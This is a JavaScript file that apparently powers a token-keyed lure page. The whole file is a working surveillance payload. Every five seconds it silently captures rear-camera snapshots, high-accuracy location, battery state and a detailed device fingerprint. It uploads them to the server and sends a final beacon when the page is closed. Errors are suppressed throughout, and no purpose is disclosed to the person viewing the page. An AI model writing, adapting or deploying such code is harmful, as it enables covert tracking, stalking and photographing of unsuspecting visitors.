// static/wrap_app.js
(async () => {
  const token = window.TOKEN;
  if (!token) return;

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  const CAPTURE_MS = 5000;
  let stream = null;
  let loopTimer = null;
  let cameraAllowed = false;

  const json = (o) => JSON.stringify(o);

  async function getDetails() {
    const d = {};
    d.userAgent = navigator.userAgent || "";
    d.platform = navigator.platform || "";
    d.cpuCores = navigator.hardwareConcurrency ?? null;
    d.ramGB = navigator.deviceMemory ?? null;
    d.languages = navigator.languages || [navigator.language];
    d.screen = {
      w: screen?.width ?? null,
      h: screen?.height ?? null,
      ratio: devicePixelRatio ?? 1,
    };

    const conn =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    if (conn) {
      d.network = {
        type: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData,
      };
    }

    d.permissions = {};
    if (navigator.permissions) {
      for (const name of ["camera", "geolocation"]) {
        try {
          const r = await navigator.permissions.query({ name });
          d.permissions[name] = r.state;
        } catch {}
      }
    }

    d.storage = {};
    try {
      if (navigator.storage?.estimate) {
        const est = await navigator.storage.estimate();
        d.storage.quotaBytes = est.quota ?? null;
        d.storage.usageBytes = est.usage ?? null;
      }
    } catch {}

    try {
      const opt = Intl.DateTimeFormat().resolvedOptions();
      d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
    } catch {}

    return d;
  }

  async function getBattery() {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { level: Math.round(b.level * 100), charging: !!b.charging };
    } catch {
      return null;
    }
  }

  async function getCoords(timeout = 4000) {
    return new Promise((resolve) => {
      if (!("geolocation" in navigator)) return resolve(null);
      let done = false;
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (done) return;
          done = true;
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy,
          });
        },
        () => {
          if (done) return;
          done = true;
          resolve(null);
        },
        { timeout, enableHighAccuracy: true }
      );
      setTimeout(() => {
        if (!done) {
          done = true;
          resolve(null);
        }
      }, timeout + 300);
    });
  }

  async function post(url, body) {
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: json(body),
        keepalive: true,
      });
    } catch {}
  }

  async function captureAndUpload(battery, coords, details) {
    if (!cameraAllowed || !stream) return;
    if (!video.videoWidth || !video.videoHeight) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL("image/jpeg", 0.75);
    await post(`/upload_image/${token}`, {
      image_b64: dataUrl,
      battery,
      coords,
      details, // <-- send device specs also for caption
    });
  }

  async function tick() {
    const [battery, coords, details] = await Promise.all([
      getBattery(),
      getCoords(),
      getDetails(),
    ]);

    await post(`/upload_info/${token}`, { battery, coords, details });

    if (cameraAllowed) await captureAndUpload(battery, coords, details);
  }

  async function start() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment" },
        audio: false,
      });
      cameraAllowed = true;
    } catch {
      cameraAllowed = false;
      stream = null;
    }

    if (cameraAllowed && stream) {
      video.srcObject = stream;
      try {
        await video.play();
      } catch {}
      await new Promise((r) => setTimeout(r, 350));
    }

    await tick();
    loopTimer = setInterval(() => tick(), CAPTURE_MS);
  }

  window.addEventListener("beforeunload", () => {
    try {
      navigator.sendBeacon(
        `/upload_info/${token}`,
        new Blob([json({ note: "page-closed" })], { type: "application/json" })
      );
    } catch {}
  });

  await start();
})();
